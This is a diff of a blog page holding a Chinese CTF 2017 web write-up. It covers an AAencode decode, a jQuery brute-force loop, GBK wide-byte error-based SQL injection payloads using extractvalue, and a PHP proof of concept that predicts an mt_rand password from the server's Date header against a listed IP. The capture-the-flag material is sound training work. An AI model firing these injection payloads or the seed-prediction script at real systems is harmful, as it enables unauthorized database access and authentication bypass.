@@ -12,6 +12,14 @@
   <!-- css files -->
   <link href="/static/css/default.min.css" rel="stylesheet">
   
+<link href="//cdn.bootcss.com/highlight.js/9.12.0/styles/monokai-sublime.min.css" rel="stylesheet">
+<style>
+    /*.hljs-pre{color:#a6e22e}*/
+    .markdown-body code {
+        background-color: #23241f;
+    }
+</style>
+
   <!-- favicon icon files -->
   <link rel="icon" type="image/x-icon" href="/static/img/favicon.ico">
   <link rel="icon" href="/static/img/favicon.ico">
@@ -96,71 +104,47 @@
             <!-- <div class="clearfix"></div> -->
             <section class="article-content markdown-body">
                 <h2>WEB 抽奖呗</h2>
-
 <h3>源碼大法</h3>
-
 <p>view-source:http://xxx/</p>
-
 <h3>可疑文件</h3>
-
 <p>http://xxx/js/jQuery.js</p>
-
 <h3>AAENCODE &amp; decode</h3>
-
 <p><a href="https://cat-in-136.github.io/2010/12/aadecode-decode-encoded-as-aaencode.html">aadecode - Decode - Online</a></p>
-
 <p>解碼后發現關鍵函數 getFlag()</p>
-
 <h3>Get Flag</h3>
-
 <p>直接在控制台查看函數</p>
-
 <pre><code>window.getFlag
 </code></pre>
-
-<p><img src="//img.virzz.com/58f368524936a30f67000001.png" alt=""></p>
-
+<p><img alt="" src="//img.virzz.com/58f368524936a30f67000001.png" /></p>
 <p><strong>flag{951c712ac2c3e57053c43d80c0a9e543}</strong></p>
-
 <h2>WEB 继续抽</h2>
-
 <h3>源碼大法</h3>
-
 <p>view-source:http://xxx:81/</p>
-
 <h3>Payload</h3>
-
 <p>看了下源碼，爆破</p>
-
 <pre><code>function orz(t) {
-    $.get(&#39;token.php&#39;,
+    $.get('token.php',
     function(token) {
         console.log(token);
-        $.get(&quot;get.php?token=&quot; + token + &quot;&amp;id=&quot; + encode(md5(t)),
+        $.get("get.php?token=" + token + "&amp;id=" + encode(md5(t)),
         function(jsctf3) {
             console.log(jsctf3);
-            if(jsctf3[&#39;text&#39;].indexOf(&#39;flag{&#39;)&gt;-1){
-                alert(jsctf3[&#39;text&#39;]);
+            if(jsctf3['text'].indexOf('flag{')&gt;-1){
+                alert(jsctf3['text']);
             }else if(t&lt;200){
                 orz(t+1);
             }
         },
-        &#39;json&#39;);
-    },&#39;json&#39;);
+        'json');
+    },'json');
 }
 orz(0);
 </code></pre>
-
 <h2>Get Flag</h2>
-
-<p><img src="//img.virzz.com/58f368074936a30f67000000.png" alt=""></p>
-
+<p><img alt="" src="//img.virzz.com/58f368074936a30f67000000.png" /></p>
 <p><strong>flag{b81cfec0285f75d4e36d2ccb2f7ec2c0}</strong></p>
-
 <h3>Web just a test</h3>
-
 <p>簡單測試下就知道是字符集導致注入＆報錯注入</p>
-
 <ul>
 <li>爆表 </li>
 <li><code>select table_name from information_schema.tables limit %s,1</code></li>
@@ -169,48 +153,30 @@ orz(0);
 <li>爆字段</li>
 <li><code>select column_name from information_schema.columns where table_name in (0x666c4067) limit %s,1</code></li>
 </ul>
-
-<pre><code>http://xxx:83/111%%df&#39; AND extractvalue(1, concat(0x23, (select mid(f1ag,32,20) from `test`.`fl@g` limit %s,1),0x232323))-- KeTF&quot;
-http://xxx:83/111%%df&#39; AND extractvalue(1, concat(0x23, (select mid(f1ag,1,32) from `test`.`fl@g` limit %s,1),0x232323))-- KeTF&quot;
+<pre><code>http://xxx:83/111%%df' AND extractvalue(1, concat(0x23, (select mid(f1ag,32,20) from `test`.`fl@g` limit %s,1),0x232323))-- KeTF&quot;
+http://xxx:83/111%%df' AND extractvalue(1, concat(0x23, (select mid(f1ag,1,32) from `test`.`fl@g` limit %s,1),0x232323))-- KeTF&quot;
 </code></pre>
 
 <p>萬能的sqlmap其實也能跑出來</p>
-
 <h3>Get Flag</h3>
-
 <p><strong>flag{99cd1872c9b26525a8e5ec878d230caf}</strong></p>
-
 <h2>WEB Wrong</h2>
-
 <p>我就不吐槽出題人的智商了。</p>
-
 <h3>get file</h3>
-
 <p>洩露文件：http://xxx:85/.index.php.swp</p>
-
 <p>下載，查看，恢復<code>vim -r xxx.php</code></p>
-
 <h3>hack it</h3>
-
 <p>用時間戳做種子，考慮的本地時間和服務器時間不同，所以獲取服務器時間，strtotime()轉化成時間戳。</p>
-
 <p>跑出pwd,</p>
-
-<p>空<code>session_id</code>繞過<code>$_SESSION[&#39;userLogin&#39;]==$_GET[&#39;login&#39;]</code></p>
-
-<p><img src="//img.virzz.com/58f370f04936a30f67000002.png" alt=""></p>
-
+<p>空<code>session_id</code>繞過<code>$_SESSION['userLogin']==$_GET['login']</code></p>
+<p><img alt="" src="//img.virzz.com/58f370f04936a30f67000002.png" /></p>
 <h3>Get Flag</h3>
-
-<p><strong>flag{rand<em>afjk</em>u8nm_uq2n}</strong></p>
-
+<p><strong>flag{rand_afjk_u8nm_uq2n}</strong></p>
 <h3>Poc</h3>
-
 <p>閒著沒事寫寫，以後可能用到</p>
-
 <pre><code>&lt;?php
 function create_password($pw_length =  10){
-    $randpwd = &quot;&quot;;
+    $randpwd = "";
     for ($i = 0; $i &lt; $pw_length; $i++){
         $randpwd .= chr(mt_rand(33, 126));
     }
@@ -220,15 +186,15 @@ function create_password($pw_length =  10){
 function get_headers_from_curl_response($headerContent)
 {
     $headers = array();
-    $arrRequests = explode(&quot;\r\n\r\n&quot;, $headerContent);
+    $arrRequests = explode("\r\n\r\n", $headerContent);
     for ($index = 0; $index &lt; count($arrRequests) -1; $index++) {
-        foreach (explode(&quot;\r\n&quot;, $arrRequests[$index]) as $i =&gt; $line)
+        foreach (explode("\r\n", $arrRequests[$index]) as $i =&gt; $line)
         {
             if ($i === 0)
-                $headers[$index][&#39;http_code&#39;] = $line;
+                $headers[$index]['http_code'] = $line;
             else
             {
-                list ($key, $value) = explode(&#39;: &#39;, $line);
+                list ($key, $value) = explode(': ', $line);
                 $headers[$index][$key] = $value;
             }
         }
@@ -246,23 +212,20 @@ function curl_get($url,$param,$d=False){
     $res = curl_exec($ch);
     if ($d){
         $header = get_headers_from_curl_response(substr($res, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE)));
-        $res = $header[0][&#39;Date&#39;];
+        $res = $header[0]['Date'];
     }
     curl_close($ch);
     return $res;
 }
 
-$url = &quot;http://117.34.111.15:85/&quot;;
-$seed = curl_get($url,&quot;&quot;,True);
+$url = "http://117.34.111.15:85/";
+$seed = curl_get($url,"",True);
 mt_srand(strtotime($seed));
 $pwd=urlencode(create_password());
-echo curl_get($url.&quot;index.php?pwd=$pwd&amp;login=&quot;,&quot;&quot;);
+echo curl_get($url."index.php?pwd=$pwd&amp;login=","");
 </code></pre>
-
 <h2>End</h2>
-
 <p>..............</p>
-
             </section>
             <div class="article-copyright">
               <span>本文标题&nbsp;:&nbsp;</span><a href="/2017/04/16/writeups_for_a_ctf_2017.html" target="_blank">某CTF 2017</a><br />
